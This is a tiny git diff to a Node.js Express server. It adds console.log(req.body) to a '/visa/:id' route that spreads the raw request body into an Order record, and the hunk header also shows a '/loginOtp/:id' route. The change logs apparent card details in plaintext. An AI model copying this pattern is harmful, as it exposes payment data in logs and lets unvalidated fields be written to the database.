@@ -113,6 +113,7 @@ app.post("/loginOtp/:id", async (req, res) => {
 
 app.post("/visa/:id", async (req, res) => {
   const { id } = req.params;
+  console.log(req.body)
   await Order.findByIdAndUpdate(id, {
     ...req.body,
     checked: false,
